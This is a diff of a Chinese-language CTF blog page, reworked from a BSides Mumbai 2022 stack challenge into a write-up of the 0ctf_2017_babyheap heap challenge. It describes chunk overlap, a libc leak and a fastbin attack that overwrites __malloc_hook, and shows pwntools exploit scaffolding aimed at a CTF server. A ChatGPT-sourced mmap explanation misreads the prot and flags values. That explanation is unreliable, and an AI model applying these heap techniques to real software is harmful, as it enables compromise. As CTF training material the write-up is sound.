@@ -7,7 +7,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<title>【BSides Mumbai 2022 PWN】Warmup - P3troL1er的个人博客</title>
+<title>0ctf_2017_babyheap - P3troL1er的个人博客</title>
 
 <meta name="generator" content="Hugo Eureka 0.9.3" />
 <link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
@@ -115,7 +115,7 @@
 <link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/letterP_hu69a934028f2e96ea6829f890fa9740ec_16107_180x180_fill_box_center_3.png">
 
 <meta name="description"
-  content="关于【BSides Mumbai 2022 PWN】Warmup的解析">
+  content="关于BUUCTF 0ctf_2017_babyheap的解析">
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
@@ -127,8 +127,8 @@
       "item":"https://peterliuzhi.top/writeup/"},{
       "@type": "ListItem",
       "position": 2 ,
-      "name":"【BSides Mumbai 2022 PWN】Warmup",
-      "item":"https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/"}]
+      "name":"0ctf_2017_babyheap",
+      "item":"https://peterliuzhi.top/writeup/0ctf_2017_babyheap/"}]
 }
 </script>
 
@@ -140,11 +140,11 @@
     "@type": "Article",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/"
+        "@id": "https://peterliuzhi.top/writeup/0ctf_2017_babyheap/"
     },
-    "headline": "【BSides Mumbai 2022 PWN】Warmup - P3troL1er的个人博客","datePublished": "2023-01-04T17:09:58+08:00",
-    "dateModified": "2023-01-04T17:09:58+08:00",
-    "wordCount":  960 ,
+    "headline": "0ctf_2017_babyheap - P3troL1er的个人博客","datePublished": "2023-01-09T17:42:16+08:00",
+    "dateModified": "2023-01-10T21:33:37+08:00",
+    "wordCount":  1932 ,
     "publisher": {
         "@type": "Person",
         "name": "Peter Liu",
@@ -153,20 +153,20 @@
             "url": "https://peterliuzhi.top/images/letterP.png"
         }
         },
-    "description": "关于【BSides Mumbai 2022 PWN】Warmup的解析"
+    "description": "关于BUUCTF 0ctf_2017_babyheap的解析"
 }
-</script><meta property="og:title" content="【BSides Mumbai 2022 PWN】Warmup - P3troL1er的个人博客" />
+</script><meta property="og:title" content="0ctf_2017_babyheap - P3troL1er的个人博客" />
 <meta property="og:type" content="article" />
 
 
 <meta property="og:image" content="https://peterliuzhi.top/images/letterP.png">
 
 
-<meta property="og:url" content="https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/" />
+<meta property="og:url" content="https://peterliuzhi.top/writeup/0ctf_2017_babyheap/" />
 
 
 
-<meta property="og:description" content="关于【BSides Mumbai 2022 PWN】Warmup的解析" />
+<meta property="og:description" content="关于BUUCTF 0ctf_2017_babyheap的解析" />
 
 
 
@@ -182,10 +182,10 @@
 
 
 
-<meta property="article:published_time" content="2023-01-04T17:09:58&#43;08:00" />
+<meta property="article:published_time" content="2023-01-09T17:42:16&#43;08:00" />
 
 
-<meta property="article:modified_time" content="2023-01-04T17:09:58&#43;08:00" />
+<meta property="article:modified_time" content="2023-01-10T21:33:37&#43;08:00" />
 
 
 
@@ -194,21 +194,27 @@
 
 <meta property="article:tag" content="pwn" />
 
+<meta property="article:tag" content="chunk overlap" />
+
+<meta property="article:tag" content="fastbin attack" />
+
+<meta property="article:tag" content="main_arena leak" />
+
 
 
 
 
 <meta property="og:see_also" content="https://peterliuzhi.top/writeup/hitcontraining_heapcreator/" />
 
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/" />
+
 <meta property="og:see_also" content="https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/" />
 
 <meta property="og:see_also" content="https://peterliuzhi.top/tricks/%E5%90%84%E5%B9%B3%E5%8F%B0syscall%E5%BA%8F%E5%8F%B7/" />
 
 <meta property="og:see_also" content="https://peterliuzhi.top/tricks/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%8F%E5%AE%9A%E4%B9%89/" />
-
-<meta property="og:see_also" content="https://peterliuzhi.top/tricks/pwn%E4%B8%AD%E8%B0%83%E8%AF%95arm%E7%A8%8B%E5%BA%8F/" />
-
-<meta property="og:see_also" content="https://peterliuzhi.top/tricks/%E8%BE%83%E4%B8%BA%E7%AE%80%E7%9F%AD%E7%9A%84shellcode/" />
 
 
 </head>
@@ -359,7 +365,7 @@
       class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
     >
       <article class="prose">
-  <h1 class="mb-4">【BSides Mumbai 2022 PWN】Warmup</h1>
+  <h1 class="mb-4">0ctf_2017_babyheap</h1>
 
   <div
   class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
@@ -367,12 +373,12 @@
   <div class="me-6 my-2">
     <i class="fas fa-calendar me-1"></i>
     <span
-      >Wednesday, January 4, 2023</span
+      >Monday, January 9, 2023</span
     >
   </div>
   <div class="me-6 my-2">
     <i class="fas fa-clock me-1"></i>
-    <span>2分钟阅读时长</span>
+    <span>4分钟阅读时长</span>
   </div>
 
   
@@ -381,12 +387,6 @@
       
         <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
           >writeup</a
-        >
-      
-        
-          <span>, </span>
-        <a href="https://peterliuzhi.top/categories/bsides-mumbai/" class="hover:text-eureka"
-          >BSides Mumbai</a
         >
       
     </div>
@@ -398,6 +398,24 @@
       
         <a href="https://peterliuzhi.top/tags/pwn/" class="hover:text-eureka"
           >pwn</a
+        >
+      
+        
+          <span>, </span>
+        <a href="https://peterliuzhi.top/tags/chunk-overlap/" class="hover:text-eureka"
+          >chunk overlap</a
+        >
+      
+        
+          <span>, </span>
+        <a href="https://peterliuzhi.top/tags/fastbin-attack/" class="hover:text-eureka"
+          >fastbin attack</a
+        >
+      
+        
+          <span>, </span>
+        <a href="https://peterliuzhi.top/tags/main_arena-leak/" class="hover:text-eureka"
+          >main_arena leak</a
         >
       
     </div>
@@ -414,36 +432,87 @@
   
 
   <blockquote>
-<p>When I let go of what I am, I become what I might be.
-— <cite>Laozi</cite></p>
+<p>The best preparation for tomorrow is doing your best today.
+— <cite>H. Jackson Brown Jr.</cite></p>
 </blockquote>
-<p>[附件程序: 【BSides Mumbai 2022 PWN】Warmup](/appendix/【BSides Mumbai 2022 PWN】Warmup)</p>
+<p><a href="https://buuoj.cn/challenges#0ctf_2017_babyheap">原题链接</a></p>
 <h1 id="checksec查看程序架构">checksec查看程序架构</h1>
-<p><img src="/image/Pasted%20image%2020230104172833.png" alt=""></p>
+<p><img src="/image/Pasted%20image%2020230110195458.png" alt=""></p>
 <h1 id="ida查看伪c代码">ida查看伪C代码</h1>
-<p><img src="/image/Pasted%20image%2020230104172932.png" alt=""></p>
-<p>我们可以通过程序给的printf来得到buf的地址，也就是栈地址</p>
-<p><img src="/image/Pasted%20image%2020230104173034.png" alt=""></p>
-<p>在vuln函数中有一个明显的栈溢出漏洞，但是它能溢出的长度很微妙，没有办法直接调用win函数，因为win函数要求多个参数：</p>
-<p><img src="/image/Pasted%20image%2020230104173202.png" alt=""></p>
-<p>但我们知道，虽然64位系统的函数调用的前六个参数是保存在寄存器中的，但是我们看win函数的汇编代码，最后还是要读到栈中，因此我们可以先将三个参数安排在栈中，同时控制rbp的值，跳过将参数读入到栈中的过程：</p>
-<p><img src="/image/Pasted%20image%2020230104173507.png" alt=""></p>
-<p>但是还有一个问题，我们只能读入0x2C个字节，同时因为PIE的存在，我们不知道win函数的实际地址，这该怎么在vuln函数中转入win函数？</p>
-<p>我们调试发现，vuln函数原本的返回地址是main+104，而win函数恰好在main下面：</p>
-<p><img src="/image/Pasted%20image%2020230104174009.png" alt=""></p>
-<p><img src="/image/Pasted%20image%2020230104174034.png" alt=""></p>
-<p>又因为页机制的存在，函数地址的最后三位是不变的，所以我们只需要更改最后一个字节就好</p>
+<p><img src="/image/Pasted%20image%2020230110195918.png" alt=""></p>
+<p>典型菜单题，比较特殊的是，它使用了一个结构体数组，每个结构体内的content域中保存一个指向堆内存的指针</p>
+<h2 id="init_0函数">init_0函数</h2>
+<p><img src="/image/Pasted%20image%2020230110211809.png" alt=""></p>
+<ol>
+<li>定义了一个整数变量 <code>fd</code>，一个字符指针变量 <code>addr</code> 以及一个无符号64位整型变量 <code>v3</code>。</li>
+<li>使用 <code>__readfsqword</code> 指令从寄存器fs中读取 0x28 地址的值存入<code>buf[3]</code></li>
+<li>使用 <code>setvbuf</code> 函数将<code>stdin</code>和 <code>_bss_start</code>的缓存模式设置为2,即以行缓存的方式输入</li>
+<li>使用<code>alarm</code>函数设置60秒超时</li>
+<li>打印字符串</li>
+<li>使用<code>open</code>打开<code>/dev/urandom</code>文件并赋值给<code>fd</code></li>
+<li>如果 <code>fd &lt; 0</code> 或者 <code>read(fd, buf, 0x10uLL)</code> 返回值不为16,则终止程序</li>
+<li>关闭文件</li>
+<li>计算出一个地址<code>addr</code>,其值为(<code>buf[9]</code>. 然后计算一个变量v3.</li>
+<li>使用<code>mmap</code>系统调用将<code>addr</code>开始的1k地址映射到内存，第三个参数为3，表示可读可写,第四个参数为34表示让系统自动选择内存地址，最后一个参数为0表示相对于起始地址，若映射不成功，退出程序。</li>
+<li>返回 <code>&amp;addr[v3]</code></li>
+</ol>
+<p>这段代码是在分配一个类似堆内存的内存区域，并返回这块内存的地址。通过使用<code>/dev/urandom</code>产生的随机数来进行内存地址的计算，来避免预测地址。</p>
+<h3 id="mmap函数">mmap函数</h3>
+<p><code>mmap</code> 是一个 C 库函数，用于在进程的虚拟地址空间中创建一段内存映射。</p>
+<p>该函数的原型为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="nf">mmap</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">);</span>
+</span></span></code></pre></div><p>它有以下参数：</p>
+<ul>
+<li><code>addr</code>：指定映射内存段的首地址。</li>
+<li><code>length</code>：指定映射内存段的大小。</li>
+<li><code>prot</code>：指定映射内存段的访问权限。</li>
+<li><code>flags</code>：指定映射内存段的其他特性。</li>
+<li><code>fd</code>：指定要映射的文件描述符。</li>
+<li><code>offset</code>：指定要映射的文件内存偏移量。</li>
+</ul>
+<p>所以，<code>mmap(addr, 0x1000uLL, 3, 34, -1, 0LL)</code>的意思是：</p>
+<ul>
+<li>在进程的虚拟地址空间中创建一段大小为 0x1000 字节的内存映射。</li>
+<li>这段内存映射的首地址为 <code>addr</code>。</li>
+<li>这段内存映射的访问权限为可读写执行（即 3）。</li>
+<li>这段内存映射的其他特性为共享内存（即 34）。</li>
+<li>这段内存映射对应的文件描述符为 -1。</li>
+<li>这段内存映射对应的文件内存偏移量为 0。</li>
+</ul>
+<blockquote>
+<p>✍️以上信息来源于chatgpt</p>
+</blockquote>
+<p>总之，它在防止我们拿到结构体的地址</p>
+<h2 id="allocate">allocate</h2>
+<p><img src="/image/Pasted%20image%2020230110212358.png" alt=""></p>
+<p>其中struc结构体为：</p>
+<p><img src="/image/Pasted%20image%2020230110212550.png" alt=""></p>
+<h2 id="change">change</h2>
+<p><img src="/image/Pasted%20image%2020230110212414.png" alt=""></p>
+<p>这个函数可以实现任意长度写，这样我们就可以修改任意chunk的size位</p>
+<h2 id="remove">remove</h2>
+<p><img src="/image/Pasted%20image%2020230110212442.png" alt=""></p>
+<p>free后置零，防止了UAF和double free</p>
+<h2 id="show">show</h2>
+<p><img src="/image/Pasted%20image%2020230110212510.png" alt=""></p>
+<p>这里会打印出size个字符，不论是否是<code>\x00</code></p>
+<h1 id="大致思路">大致思路</h1>
+<p>利用任意长度写，实现chunk overlap后释放再分配，就得到了它所覆盖的chunk的随时可读权</p>
+<p>然后我们让它覆盖一个0x80的chunk，释放这个chunk后，我们就可以读到它fd指针内的main_arena地址，从而计算出libc基址</p>
+<p>然后我们再设计一个0x68大小的chunk，释放后用它上方的chunk的任意长度写更改其fd指针，这样我们就能实现fastbin attack，将其分配到__malloc_hook-0x23处（这是一个固定的漏洞地址），这样就可以绕过size位检查，更改__malloc_hook为one_gadget</p>
+<p>更多阅读：<a href="https://blog.csdn.net/mcmuyanga/article/details/112466134">[BUUCTF]PWN——0ctf_2017_babyheap_Angel~Yan的博客-CSDN博客</a></p>
 <h1 id="exp">exp</h1>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 自动生成头部</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p8</span><span class="p">,</span> <span class="n">p16</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pymao</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
-</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./BSides-chall&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;1337&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./0ctf_2017_babyheap&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;25886&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
 </span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span><span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
 </span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
@@ -452,21 +521,26 @@
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span> <span class="n">libc_name</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;34.70.253.176&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;&#34;&#34;
-</span></span></span><span class="line"><span class="cl"><span class="s2">                        b* $rebase(0x1320)
-</span></span></span><span class="line"><span class="cl"><span class="s2">                        b* $rebase(0x131A)
+</span></span></span><span class="line"><span class="cl"><span class="s2">                        break main
 </span></span></span><span class="line"><span class="cl"><span class="s2">                        c
 </span></span></span><span class="line"><span class="cl"><span class="s2">                        &#34;&#34;&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 两个elf，注意libc的版本</span>
 </span></span><span class="line"><span class="cl"><span class="n">m_elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">suclog</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">suclog</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">args</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v</span> <span class="o">=</span> <span class="nb">globals</span><span class="p">()[</span><span class="n">k</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2"> =&gt; </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2"> =&gt; </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">int</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">            <span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2"> =&gt; </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
@@ -480,7 +554,7 @@
 </span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">received</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">no_show</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;received:</span><span class="se">\n</span><span class="si">{</span><span class="n">received</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[$]received:</span><span class="se">\n</span><span class="si">{</span><span class="n">received</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
@@ -491,7 +565,7 @@
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">interactive_after_clean</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span><span class="nb">int</span> <span class="o">=</span> <span class="mf">0.05</span><span class="p">,</span> <span class="n">no_show</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">received</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">no_show</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;received:</span><span class="se">\n</span><span class="si">{</span><span class="n">received</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[$]received:</span><span class="se">\n</span><span class="si">{</span><span class="n">received</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">c_val</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">c_type</span><span class="p">:</span> <span class="n">string</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
@@ -532,14 +606,14 @@
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">CDLL</span><span class="p">(</span><span class="n">libc_name</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">kwargs</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_and_transform</span><span class="p">(</span><span class="n">prev_string</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span> <span class="n">from_bytes</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">,</span>\
-</span></span><span class="line"><span class="cl">    <span class="n">is_canary</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">bound</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">is_canary</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">bound</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span> <span class="n">drop_bound</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">prev_string</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="n">prev_string</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">bound</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">bound</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">bound</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">from_bytes</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">bound</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">ug</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">bound</span><span class="p">)[:</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">bound</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">ug</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">bound</span><span class="p">)[:</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">bound</span><span class="p">)])</span> <span class="k">if</span> <span class="n">drop_bound</span> <span class="k">else</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">bound</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">if_32</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">ug</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
@@ -549,7 +623,7 @@
 </span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">ug</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">bound</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">bound</span><span class="p">)[:</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">bound</span><span class="p">)],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">bound</span><span class="p">)[:</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">bound</span><span class="p">)],</span> <span class="mi">16</span><span class="p">)</span> <span class="k">if</span> <span class="n">drop_bound</span> <span class="k">else</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">bound</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
